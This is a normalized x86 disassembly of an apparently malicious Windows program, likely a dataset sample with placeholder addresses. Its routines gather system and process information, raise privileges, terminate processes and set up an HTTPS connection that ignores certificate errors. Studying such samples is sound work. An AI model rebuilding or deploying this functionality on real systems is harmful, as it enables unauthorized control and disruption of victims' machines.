mov [ esp + 0x18 ] eax
fild [ esp + 0x14 ]
mov ecx 0x80
lea edi [ esp + 0x7c ]
sub esp 0x8
fmul [ r--data ]
[ edi ]
fstp [ esp ]
lea eax [ esp + 0x84 ]
push rw-data
push eax
call sprintf
lea edi [ esp + 0x8c ]
or ecx 0xffffffff
xor eax eax
add esp 0x10
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov ecx 0x80
lea edi [ esp + 0x7c ]
[ edi ]
lea eax [ esp + 0x2c ]
mov [ esp + 0x2c ] 0x20
push eax
call [ GlobalMemoryStatus@IAT ]
mov ecx [ esp + 0x40 ]
mov edx [ esp + 0x3c ]
mov eax [ esp + 0x30 ]
shr ecx 0x14
push ecx
mov ecx [ esp + 0x38 ]
shr edx 0x14
push edx
push eax
shr ecx 0x14
push ecx
lea edx [ esp + 0x8c ]
push rw-data
push edx
call sprintf
add esp 0x18
or ecx 0xffffffff
lea edi [ esp + 0x7c ]
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov ebx 0x43
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
mov [ esp + 0x14 ] 0x18
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
sub_407070
push esi
mov esi ecx
push edi
mov edi 0x2000
mov eax [ esi + 0x4 ]
test eax eax
jne r-xdata
push 0x2000
call malloc
add esp 0x4
mov [ esi + 0x4 ] eax
test eax eax
je r-xdata
push 0x0
call free
add esp 0x4
pop edi
pop esi
retn
push 0x0
push 0x2000
push eax
push 0x5
call [ esi ]
cmp eax 0xc0000004
jne r-xdata
mov eax [ esi + 0x4 ]
add edi 0x2000
push edi
push eax
call realloc
add esp 0x8
mov [ esi + 0x4 ] eax
push 0x0
push edi
push eax
push 0x5
call [ esi ]
cmp eax 0xc0000004
je r-xdata
sub_4070e0
mov eax 0x2214
call sub_4089e0
push ebx
push ebp
push esi
push edi
mov ebx ecx
push 0x2000
call malloc
mov edi eax
mov ecx 0x800
xor eax eax
mov [ esp + 0x18 ] edi
[ edi ]
push 0x2000
call malloc
mov ebp eax
mov ecx 0x800
xor eax eax
mov edi ebp
[ edi ]
mov [ esp + 0x1b ] al
mov eax [ ebx + 0x4 ]
add esp 0x8
test eax eax
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov [ esp + 0x18 ] eax
mov esi edi
mov edi [ esp + 0x14 ]
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov ecx ebx
call sub_407070
inc [ esp + 0x18 ]
mov [ esp + 0x13 ] 0x1
jmp r-xdata
push rw-data
push ebp
call sprintf
add esp 0xc
lea ecx [ esp + 0x124 ]
push ecx
push rw-data
push ebp
call sprintf
add esp 0x10
jmp r-xdata
mov ecx 0x82
xor eax eax
lea edi [ esp + 0x1c ]
[ edi ]
mov ecx [ edx + 0x44 ]
lea eax [ esp + 0x1c ]
push eax
push ecx
mov ecx ebx
call sub_4073a0
mov eax [ ebx + 0x4 ]
push 0x0
push 0x0
lea edx [ esp + 0x22c ]
mov ecx [ eax + 0x3c ]
push 0x2000
push edx
push 0xffffffff
push ecx
push 0x200
push 0x0
call [ WideCharToMultiByte@IAT ]
mov eax [ ebx + 0x4 ]
lea edx [ esp + 0x224 ]
push edx
mov ecx [ eax + 0x44 ]
push ecx
push rw-data
push ebp
call sprintf
mov edi ebp
or ecx 0xffffffff
xor eax eax
add esp 0x10
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi [ esp + 0x14 ]
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x120 ]
or ecx 0xffffffff
[ edi ]
not ecx
lea eax [ esp + 0x1c ]
dec ecx
push eax
je r-xdata
mov edx [ ebx + 0x4 ]
cmp [ edx ] 0x0
jne r-xdata
mov edx [ esp + 0x18 ]
push edx
push rw-data
push ebp
call sprintf
mov edi ebp
or ecx 0xffffffff
xor eax eax
add esp 0xc
[ edi ]
mov edx [ esp + 0x14 ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
mov eax edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x2214
retn
mov edi ebp
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi [ esp + 0x14 ]
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
add ecx eax
mov al [ esp + 0x13 ]
test al al
mov [ ebx + 0x4 ] ecx
je r-xdata
sub_407300
sub esp 0x1c
lea eax [ esp ]
push eax
push 0x20028
call [ GetCurrentProcess@IAT ]
push eax
call [ OpenProcessToken@IAT ]
test eax eax
jne r-xdata
mov edx [ esp + 0x20 ]
lea ecx [ esp + 0x4 ]
push ecx
push edx
push 0x0
call [ LookupPrivilegeValueA@IAT ]
test eax eax
jne r-xdata
add esp 0x1c
retn 0x8
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x24 ]
mov ecx [ esp + 0x8 ]
mov [ esp + 0x10 ] eax
neg edx
push 0x0
push 0x0
lea eax [ esp + 0x14 ]
mov [ esp + 0x1c ] ecx
mov ecx [ esp + 0x8 ]
push 0x0
sbb edx edx
push eax
and edx 0x2
push 0x0
push ecx
mov [ esp + 0x24 ] 0x1
mov [ esp + 0x30 ] edx
call [ AdjustTokenPrivileges@IAT ]
mov edx [ esp ]
push edx
call [ CloseHandle@IAT ]
call [ GetLastError@IAT ]
neg eax
sbb eax eax
inc eax
add esp 0x1c
retn 0x8
mov eax 0x1
add esp 0x1c
retn 0x8
sub_4073a0
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x34
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
xor edi edi
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x4 ] ebx
mov eax [ ebp + 0x8 ]
push eax
push ebx
push 0x400
call [ OpenProcess@IAT ]
mov esi eax
mov [ ebp - 0x1c ] esi
cmp esi ebx
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
call sub_4074b1
xor ebx ebx
mov edi [ ebp - 0x20 ]
mov esi [ ebp - 0x1c ]
cmp esi ebx
je r-xdata
lea ecx [ ebp - 0x28 ]
push ecx
push 0x8
push esi
call [ OpenProcessToken@IAT ]
mov edi eax
mov [ ebp - 0x20 ] edi
cmp edi ebx
je r-xdata
mov eax [ ebp - 0x28 ]
cmp eax ebx
je r-xdata
push esi
call [ CloseHandle@IAT ]
mov [ ebp - 0x30 ] ebx
lea edx [ ebp - 0x30 ]
push edx
push ebx
push ebx
push 0x1
mov eax [ ebp - 0x28 ]
push eax
mov edi [ GetTokenInformation@IAT ]
call edi
mov [ ebp - 0x20 ] eax
mov ecx [ ebp - 0x30 ]
lea edx [ ecx + ecx ]
push edx
call ??2@YAPAXI@Z
add esp 0x4
mov esi eax
mov [ ebp - 0x40 ] esi
mov [ ebp - 0x24 ] esi
mov eax [ ebp - 0x30 ]
add eax eax
mov [ ebp - 0x30 ] eax
lea ecx [ ebp - 0x30 ]
push ecx
push eax
push esi
push 0x1
mov edx [ ebp - 0x28 ]
push edx
call edi
mov edi eax
mov [ ebp - 0x20 ] edi
call [ GetLastError@IAT ]
mov [ ebp - 0x3c ] eax
cmp edi ebx
je r-xdata
mov eax [ ebp - 0x24 ]
cmp eax ebx
je r-xdata
push eax
call [ CloseHandle@IAT ]
mov esi [ ebp - 0x1c ]
mov eax 0x104
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] eax
lea eax [ ebp - 0x2c ]
push eax
lea ecx [ ebp - 0x34 ]
push ecx
mov eax [ ebp + 0xc ]
lea edx [ eax + 0x104 ]
push edx
lea ecx [ ebp - 0x38 ]
push ecx
push eax
mov edx [ esi ]
push edx
push ebx
call [ LookupAccountSidA@IAT ]
mov edi eax
mov [ ebp - 0x20 ] edi
mov esp [ ebp - 0x18 ]
mov eax edi
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
push eax
call ??3@YAXPAX@Z
add esp 0x4
sub_4074b1
cmp esi ebx
je r-xdata
mov eax [ ebp - 0x28 ]
cmp eax ebx
je r-xdata
push esi
call [ CloseHandle@IAT ]
mov eax [ ebp - 0x24 ]
cmp eax ebx
je r-xdata
push eax
call [ CloseHandle@IAT ]
mov esp [ ebp - 0x18 ]
mov eax edi
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
push eax
call ??3@YAXPAX@Z
add esp 0x4
sub_407500
push ecx
push ebx
push ebp
push esi
push edi
mov ebp ecx
push 0x64
mov [ esp + 0x14 ] ebp
call malloc
mov ebx eax
mov ecx 0x19
xor eax eax
mov edi ebx
[ edi ]
push 0x64
call malloc
mov esi eax
add esp 0x8
mov ecx 0x19
xor eax eax
mov edi esi
push 0x1
[ edi ]
push rw-data
mov ecx ebp
call sub_407300
mov eax [ esp + 0x18 ]
push eax
push 0x1
push 0x1f0fff
call [ OpenProcess@IAT ]
mov ebp eax
test ebp ebp
je r-xdata
push ebp
call [ CloseHandle@IAT ]
mov ecx [ esp + 0x10 ]
push 0x0
push rw-data
call sub_407300
pop edi
pop esi
mov eax ebx
pop ebp
pop ebx
pop ecx
retn 0x4
push 0x0
push ebp
call [ TerminateProcess@IAT ]
test eax eax
mov ecx 0x19
jne r-xdata
xor eax eax
mov edi esi
[ edi ]
mov eax [ esp + 0x18 ]
push eax
push rw-data
push esi
call sprintf
mov edi esi
or ecx 0xffffffff
xor eax eax
add esp 0xc
[ edi ]
not ecx
sub edi ecx
push 0x1f4
mov esi edi
mov edx ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
call [ Sleep@IAT ]
xor eax eax
mov edi esi
[ edi ]
mov ecx [ esp + 0x18 ]
push ecx
push rw-data
push esi
call sprintf
mov edi esi
or ecx 0xffffffff
xor eax eax
add esp 0xc
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
sub_407620
sub esp 0x8
push ebx
push ebp
push esi
push edi
mov ebx ecx
push 0x2000
call malloc
mov edi eax
mov ecx 0x800
xor eax eax
mov [ esp + 0x18 ] edi
[ edi ]
add esp 0x4
mov ecx ebx
call sub_407070
mov edi [ esp + 0x1c ]
mov ebp [ MultiByteToWideChar@IAT ]
push 0x0
push 0x0
push 0xffffffff
push edi
push 0x0
push 0x0
mov [ esp + 0x28 ] 0x0
call ebp
mov esi eax
lea eax [ esi + esi ]
push eax
call ??2@YAPAXI@Z
add esp 0x4
mov [ esp + 0x1c ] eax
push esi
push eax
push 0xffffffff
push edi
push 0x0
push 0x0
call ebp
mov edx [ eax + 0x3c ]
test edx edx
jne r-xdata
mov [ esp + 0x10 ] 0x1
mov ecx [ ebx + 0x4 ]
mov eax [ esp + 0x1c ]
push 0x4
mov edx [ ecx + 0x3c ]
push edx
push eax
call _wcsnicmp
add esp 0xc
test eax eax
jne r-xdata
add ecx eax
mov [ ebx + 0x4 ] ecx
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
add ecx eax
mov eax [ esp + 0x10 ]
test eax eax
mov [ ebx + 0x4 ] ecx
je r-xdata
mov ecx [ ebx + 0x4 ]
mov edx [ ecx + 0x44 ]
mov ecx ebx
push edx
call sub_407500
mov edi eax
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi [ esp + 0x14 ]
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
test ecx ecx
jne r-xdata
mov eax [ esp + 0x14 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn 0x4
sub_407720
push 0xffffffff
push sub_409070
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
mov al [ esp + 0x3 ]
push ebx
push ebp
mov ebp ecx
push esi
xor esi esi
lea ecx [ ebp + 0xc ]
push edi
push esi
mov [ esp + 0x1c ] ebp
mov [ ecx ] al
call sub_4063b0
mov dl [ esp + 0x13 ]
lea ecx [ ebp + 0x1c ]
push esi
mov [ esp + 0x28 ] esi
mov [ ecx ] dl
call sub_4063b0
mov al [ esp + 0x13 ]
lea ecx [ ebp + 0x40 ]
push esi
mov [ esp + 0x28 ] 0x1
mov [ ecx ] al
call sub_4063b0
mov cl [ esp + 0x13 ]
mov [ ebp + 0x54 ] esi
mov [ ebp + 0x50 ] cl
mov [ ebp + 0x58 ] esi
mov [ ebp + 0x5c ] esi
mov dl [ esp + 0x13 ]
lea ebx [ ebp + 0x60 ]
mov [ ebx ] dl
mov [ ebx + 0x4 ] esi
mov [ ebx + 0x8 ] esi
mov [ ebx + 0xc ] esi
mov al [ esp + 0x13 ]
lea ecx [ ebp + 0x70 ]
push esi
mov [ esp + 0x28 ] 0x4
mov [ ecx ] al
call sub_4063b0
mov cl [ esp + 0x13 ]
mov [ ebp + 0x84 ] esi
mov [ ebp + 0x80 ] cl
mov [ ebp + 0x88 ] esi
mov [ ebp + 0x8c ] esi
mov edi rw-data
or ecx 0xffffffff
xor eax eax
mov [ ebp ] esi
mov [ ebp + 0x4 ] esi
mov [ ebp + 0x3c ] esi
mov [ ebp + 0x34 ] esi
mov [ ebp + 0x8 ] esi
mov [ ebp + 0x38 ] esi
mov [ ebp + 0x2c ] 0x1bb
[ edi ]
not ecx
dec ecx
push 0x1
mov esi ecx
mov ecx ebx
push esi
mov [ esp + 0x2c ] 0x6
mov [ esp + 0x1c ] esi
call sub_406500
test al al
je r-xdata
mov ecx [ esp + 0x1c ]
pop edi
mov [ ebp + 0x30 ] 0x84c03000
mov eax ebp
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x18
retn
mov edi [ ebx + 0x4 ]
mov ecx esi
mov edx ecx
mov esi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
mov eax edx
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ ebx + 0x4 ]
mov [ ebx + 0x8 ] eax
mov [ eax + ecx ] 0x0
sub_407850
push 0xffffffff
push sub_4090d0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ebx
push esi
mov esi ecx
mov [ esp + 0x8 ] esi
mov [ esp + 0x14 ] 0x6
call sub_407f50
push 0x1
lea ecx [ esi + 0x80 ]
mov [ esp + 0x18 ] 0x5
call sub_4063b0
mov eax [ esi + 0x74 ]
xor ebx ebx
cmp eax ebx
je r-xdata
mov [ esi + 0x74 ] ebx
mov [ esi + 0x78 ] ebx
mov [ esi + 0x7c ] ebx
mov eax [ esi + 0x64 ]
cmp eax ebx
je r-xdata
lea ecx [ eax - 0x1 ]
mov al [ eax - 0x1 ]
cmp al bl
je r-xdata
mov [ esi + 0x64 ] ebx
mov [ esi + 0x68 ] ebx
mov [ esi + 0x6c ] ebx
mov eax [ esi + 0x54 ]
cmp eax ebx
je r-xdata
lea ecx [ eax - 0x1 ]
mov al [ eax - 0x1 ]
cmp al bl
je r-xdata
push ecx
call ??3@YAXPAX@Z
add esp 0x4
cmp al 0xff
je r-xdata
mov [ esi + 0x54 ] ebx
mov [ esi + 0x58 ] ebx
mov [ esi + 0x5c ] ebx
mov eax [ esi + 0x44 ]
cmp eax ebx
je r-xdata
lea ecx [ eax - 0x1 ]
mov al [ eax - 0x1 ]
cmp al bl
je r-xdata
push ecx
call ??3@YAXPAX@Z
add esp 0x4
cmp al 0xff
je r-xdata
dec al
mov [ ecx ] al
jmp r-xdata
mov [ esi + 0x44 ] ebx
mov [ esi + 0x48 ] ebx
mov [ esi + 0x4c ] ebx
mov eax [ esi + 0x20 ]
cmp eax ebx
je r-xdata
lea ecx [ eax - 0x1 ]
mov al [ eax - 0x1 ]
cmp al bl
je r-xdata
push ecx
call ??3@YAXPAX@Z
add esp 0x4
cmp al 0xff
je r-xdata
dec al
mov [ ecx ] al
jmp r-xdata
mov [ esi + 0x20 ] ebx
mov [ esi + 0x24 ] ebx
mov [ esi + 0x28 ] ebx
mov eax [ esi + 0x10 ]
cmp eax ebx
je r-xdata
lea ecx [ eax - 0x1 ]
mov al [ eax - 0x1 ]
cmp al bl
je r-xdata
push ecx
call ??3@YAXPAX@Z
add esp 0x4
cmp al 0xff
je r-xdata
dec al
mov [ ecx ] al
jmp r-xdata
mov ecx [ esp + 0xc ]
mov [ esi + 0x10 ] ebx
mov [ esi + 0x14 ] ebx
mov [ esi + 0x18 ] ebx
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
lea ecx [ eax - 0x1 ]
mov al [ eax - 0x1 ]
cmp al bl
je r-xdata
push ecx
call ??3@YAXPAX@Z
add esp 0x4
cmp al 0xff
je r-xdata
dec al
mov [ ecx ] al
jmp r-xdata
push ecx
call ??3@YAXPAX@Z
add esp 0x4
cmp al 0xff
je r-xdata
dec al
mov [ ecx ] al
jmp r-xdata
dec al
mov [ ecx ] al
jmp r-xdata
sub_4079b0
push ebp
mov ebp esp
push 0xffffffff
push sub_4090e0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push ebx
push esi
mov esi ecx
push edi
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x14 ] esi
mov eax [ esi + 0x64 ]
mov [ ebp - 0x4 ] 0x0
test eax eax
jne r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push eax
call [ InternetOpenA@IAT ]
test eax eax
mov [ esi ] eax
jne r-xdata
mov eax r--data
mov ecx [ esi + 0x54 ]
mov edi r--data
test ecx ecx
je r-xdata
xor al al
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov ecx [ esi + 0x44 ]
mov edx r--data
test ecx ecx
je r-xdata
mov edi ecx
mov ecx [ esi + 0x10 ]
test ecx ecx
jne r-xdata
mov edx ecx
push 0x0
push 0x0
push 0x3
push edi
push edx
mov dx [ esi + 0x2c ]
push edx
push ecx
push eax
call [ InternetConnectA@IAT ]
test eax eax
mov [ esi + 0x8 ] eax
jne r-xdata
mov ecx r--data
mov ecx [ esi + 0x20 ]
mov edx r--data
test ecx ecx
je r-xdata
mov ecx esi
call sub_407f50
xor al al
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x4 ]
test ecx ecx
jne r-xdata
mov edx ecx
mov edi [ esi + 0x2094 ]
push edi
mov edi [ esi + 0x30 ]
push edi
push 0x0
push rw-data
push 0x0
push edx
push ecx
push eax
call [ HttpOpenRequestA@IAT ]
test eax eax
mov [ esi + 0x4 ] eax
jne r-xdata
mov ecx r--data
mov eax [ esi + 0x2094 ]
mov ecx [ ebp - 0xc ]
inc eax
pop edi
mov [ esi + 0x2094 ] eax
pop esi
mov al 0x1
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov ecx esi
call sub_407f50
xor al al
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_407ad4
mov edi rw-data
or ecx 0xffffffff
xor eax eax
mov edx [ ebp - 0x14 ]
[ edi ]
not ecx
dec ecx
lea ebx [ edx + 0x80 ]
mov esi ecx
cmp esi 0xfffffffd
mov [ ebp + 0x8 ] esi
jbe r-xdata
mov ecx [ ebx + 0x4 ]
xor edx edx
cmp ecx edx
je r-xdata
call sub_408c16
cmp esi edx
jne r-xdata
mov al [ ecx - 0x1 ]
test al al
je r-xdata
mov eax [ ebx + 0xc ]
cmp eax 0x1f
ja r-xdata
push 0x1
mov ecx ebx
call sub_4063b0
jmp r-xdata
cmp al 0xff
je r-xdata
push 0x1
mov ecx ebx
call sub_4063b0
cmp eax esi
jae r-xdata
call [ GetLastError@IAT ]
mov ecx [ ebp - 0x14 ]
mov [ ecx + 0x2090 ] eax
mov eax r-xdata
retn
cmp esi edx
jne r-xdata
mov edi [ ebx + 0x4 ]
mov ecx esi
mov eax ecx
mov esi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
mov eax [ ebp + 0x8 ]
and ecx 0x3
[ edi ] [ esi ]
mov [ ebx + 0x8 ] eax
mov ebx [ ebx + 0x4 ]
add ebx eax
mov [ ebx ] 0x0
push esi
mov ecx ebx
call sub_406630
dec al
mov [ ecx - 0x1 ] al
mov [ ebx + 0x4 ] edx
mov [ ebx + 0x8 ] edx
mov [ ebx + 0xc ] edx
jmp r-xdata
sub_407bc0
push ebp
mov ebp esp
push 0xffffffff
push sub_4090f0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x218
push ebx
push esi
push edi
mov ebx ecx
lea eax [ ebp - 0x20 ]
mov [ ebp - 0x10 ] esp
mov edx [ ebx + 0x4 ]
lea ecx [ ebp - 0x18 ]
push eax
push ecx
push 0x1f
push edx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x20 ] 0x4
call [ InternetQueryOptionA@IAT ]
mov ecx [ ebp - 0x18 ]
mov esi [ InternetSetOptionA@IAT ]
or ecx 0x4000100
lea eax [ ebp - 0x18 ]
mov [ ebp - 0x18 ] ecx
mov ecx [ ebx + 0x4 ]
push 0x4
push eax
push 0x1f
push ecx
call esi
mov eax [ ebx + 0x4 ]
lea edx [ ebp - 0x14 ]
push 0x4
push edx
push 0x2
push eax
mov [ ebp - 0x14 ] 0x6ddd00
call esi
mov edx [ ebx + 0x4 ]
lea ecx [ ebp - 0x14 ]
push 0x4
push ecx
push 0x6
push edx
call esi
mov ecx [ ebx + 0x4 ]
lea eax [ ebp - 0x14 ]
push 0x4
push eax
push 0x5
push ecx
call esi
mov eax [ ebx + 0x4 ]
lea edx [ ebp - 0x14 ]
push 0x4
push edx
push 0x7
push eax
call esi
mov edx [ ebx + 0x4 ]
lea ecx [ ebp - 0x14 ]
push 0x4
push ecx
push 0x8
push edx
call esi
mov esi [ ebp + 0xc ]
lea eax [ ebp - 0x224 ]
push esi
push rw-data
push rw-data
push eax
call sprintf
lea edi [ ebp - 0x224 ]
or ecx 0xffffffff
xor eax eax
add esp 0x10
[ edi ]
not ecx
dec ecx
mov [ ebp + 0xc ] eax
mov edi ecx
mov ecx [ ebp - 0xc ]
pop edi
pop esi
xor al al
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub esp 0x10
lea eax [ ebp - 0x224 ]
mov ecx esp
mov edx [ ebx + 0x4 ]
push edx
mov [ ecx ] eax
mov eax [ ebp + 0x8 ]
mov [ ecx + 0x4 ] edi
mov [ ecx + 0x8 ] eax
mov [ ecx + 0xc ] esi
mov ecx ebx
call sub_408770
and eax 0xff
mov [ ebp - 0x24 ] eax
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x2f0c
jne r-xdata
mov al 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
cmp eax 0x2f0d
jne r-xdata
mov ecx ebx
call sub_407fb0
test al al
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea esi [ ebx + 0x80 ]
[ edi ]
not ecx
dec ecx
mov edi ecx
mov ecx esi
mov [ ebp + 0xc ] edi
call sub_406620
cmp eax edi
jae r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ ebx + 0x80 ]
[ edi ]
not ecx
dec ecx
push 0x1
mov esi ecx
mov ecx edx
push esi
mov [ ebp + 0xc ] esi
call sub_406500
test al al
je r-xdata
inc [ ebp + 0xc ]
jmp r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ ebx + 0x80 ]
[ edi ]
not ecx
dec ecx
push 0x1
mov esi ecx
mov ecx edx
push esi
mov [ ebp + 0xc ] esi
call sub_406500
test al al
je r-xdata
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
call sub_408c16
call [ GetLastError@IAT ]
mov [ ebx + 0x2090 ] eax
mov edi [ ebx + 0x84 ]
mov ecx esi
mov edx ecx
mov esi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
mov eax edx
and ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
cmp [ ebp + 0xc ] 0x3
jge r-xdata
mov edi [ ebx + 0x84 ]
mov ecx esi
mov eax ecx
mov esi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
test edi edi
jne r-xdata
mov al [ ecx - 0x1 ]
test al al
je r-xdata
mov ecx [ ebx + 0x84 ]
mov [ ebx + 0x88 ] eax
mov [ ecx + eax ] 0x0
mov eax [ esi + 0xc ]
cmp eax 0x1f
ja r-xdata
push 0x1
mov ecx esi
call sub_4063b0
jmp r-xdata
cmp al 0xff
je r-xdata
push 0x1
mov ecx esi
call sub_4063b0
cmp eax edi
jae r-xdata
test edi edi
jne r-xdata
mov eax [ esi + 0x4 ]
mov ecx edi
mov edx ecx
mov esi rw-data
mov edi eax
mov eax [ ebp + 0xc ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
push eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ ebx + 0x80 ]
call sub_4064e0
jmp r-xdata
push edi
mov ecx esi
call sub_406630
dec al
push edi
mov [ ecx - 0x1 ] al
mov ecx esi
call sub_4063b0
jmp r-xdata
sub_407e8f
mov ecx [ ebp - 0x1c ]
mov edi rw-data
xor eax eax
lea ebx [ ecx + 0x80 ]
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
mov esi ecx
mov ecx ebx
mov [ ebp + 0xc ] esi
call sub_406620
cmp eax esi
jae r-xdata
mov ecx [ ebx + 0x4 ]
test ecx ecx
je r-xdata
call sub_408c16
test esi esi
jne r-xdata
mov al [ ecx - 0x1 ]
test al al
je r-xdata
mov eax [ ebx + 0xc ]
cmp eax 0x1f
ja r-xdata
push 0x1
mov ecx ebx
call sub_4063b0
jmp r-xdata
cmp al 0xff
je r-xdata
push 0x1
mov ecx ebx
call sub_4063b0
cmp eax esi
jae r-xdata
call [ GetLastError@IAT ]
mov ecx [ ebp - 0x1c ]
mov [ ecx + 0x2090 ] eax
mov eax r-xdata
retn
test esi esi
jne r-xdata
mov edi [ ebx + 0x4 ]
mov ecx esi
mov edx ecx
mov esi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov eax [ ebp + 0xc ]
mov ecx edx
and ecx 0x3
push eax
[ edi ] [ esi ]
mov ecx ebx
call sub_4064e0
push esi
mov ecx ebx
call sub_406630
dec al
push esi
mov [ ecx - 0x1 ] al
mov ecx ebx
call sub_4063b0
jmp r-xdata
sub_407f50
push ebx
push esi
mov esi ecx
xor ebx ebx
push edi
mov eax [ esi + 0x34 ]
cmp eax ebx
je r-xdata
mov eax [ esi + 0x38 ]
cmp eax ebx
je r-xdata
push 0x1
push eax
call [ CertCloseStore@IAT ]
mov [ esi + 0x34 ] ebx
mov eax [ esi + 0x4 ]
mov edi [ InternetCloseHandle@IAT ]
cmp eax ebx
je r-xdata
push eax
call [ CertFreeCertificateContext@IAT ]
mov [ esi + 0x38 ] ebx
mov eax [ esi + 0x8 ]
cmp eax ebx
je r-xdata
push eax
call edi
mov [ esi + 0x4 ] ebx
mov eax [ esi ]
cmp eax ebx
je r-xdata
push eax
call edi
